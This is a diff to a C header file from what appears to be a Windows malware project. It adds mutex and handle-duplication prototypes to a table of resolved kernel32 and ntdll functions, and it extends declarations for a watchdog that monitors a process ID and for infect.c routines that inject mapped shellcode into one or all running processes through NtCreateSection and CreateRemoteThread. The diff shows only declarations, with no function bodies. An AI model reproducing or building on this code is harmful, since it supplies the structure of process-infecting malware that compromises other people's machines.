@@ -141,6 +141,22 @@ proto_NtCreateSection(PHANDLE SectionHandle,
                       ULONG SectionPageProtection,
                       ULONG AllocationAttributes,
                       HANDLE FileHandle);
+typedef DWORD WINAPI
+proto_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
+typedef BOOL WINAPI
+proto_ReleaseMutex(HANDLE hMutex);
+typedef HANDLE WINAPI
+proto_CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes,
+                   BOOL bInitialOwner,
+                   LPCSTR lpName);
+typedef BOOL WINAPI
+proto_DuplicateHandle(HANDLE hSourceProcessHandle,
+                      HANDLE hSourceHandle,
+                      HANDLE hTargetProcessHandle,
+                      LPHANDLE lpTargetHandle,
+                      DWORD dwDesiredAccess,
+                      BOOL bInheritHandle,
+                      DWORD dwOptions);
 
 struct dll_imports
 {
@@ -155,6 +171,10 @@ struct dll_imports
   proto_VirtualFreeEx* VirtualFreeEx;
   proto_CreateRemoteThread* CreateRemoteThread;
   proto_OpenProcess* OpenProcess;
+  proto_WaitForSingleObject* WaitForSingleObject;
+  proto_ReleaseMutex* ReleaseMutex;
+  proto_CreateMutexA* CreateMutexA;
+  proto_DuplicateHandle* DuplicateHandle;
 
   /* ntdll.dll */
   proto_NtCreateSection* NtCreateSection;
@@ -169,7 +189,6 @@ resolve_dll_imports(struct dll_imports* imports);
 /* watchdog.c */
 struct watchdog_info
 {
-  LONG lock;
   ULONGLONG proc_id;
   WCHAR path[MAX_PATH + 1];
 };
@@ -177,7 +196,9 @@ struct watchdog_info
 DWORD WINAPI
 ThreadProc(_In_ LPVOID lpParameter);
 int
-monitor_proc_id(struct dll_imports* imports, struct watchdog_info* map);
+monitor_proc_id(struct dll_imports* imports,
+                struct watchdog_info* map,
+                HANDLE mutex);
 
 /* process.c */
 #define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
@@ -189,14 +210,56 @@ process_exists(struct dll_imports* imports, ULONGLONG proc_id);
 
 /* infect.c */
 
+struct thread_params
+{
+  HANDLE mutex;
+  struct watchdog_info* map;
+};
+
 int
 infect_process(struct dll_imports* imports,
                HANDLE section,
                PVOID shell_base,
                SIZE_T shell_size,
-               DWORD proc_id);
+               DWORD proc_id,
+               HANDLE mutex);
 int
 try_infect_all_processes(struct dll_imports* imports,
                          HANDLE section,
                          PVOID shell_base,
-                         SIZE_T shell_size);
+                         SIZE_T shell_size,
+                         HANDLE mutex);
+
+/* entry.c */
+
+enum meta_param_kind
+{
+  Shell = 0,
+  Watchdog = 1,
+};
+
+struct meta_param
+{
+  int kind;
+};
+
+struct shell_param
+{
+  struct meta_param _meta;
+  PVOID shell_base;
+  SIZE_T shell_size;
+  ULONGLONG proc_id;
+  WCHAR path[MAX_PATH + 1];
+};
+
+struct watchdog_param
+{
+  struct meta_param _meta;
+  struct thread_params param;
+};
+
+int
+initialize(PVOID shell_base,
+           SIZE_T shell_size,
+           ULONGLONG proc_id,
+           WCHAR path[MAX_PATH + 1]);
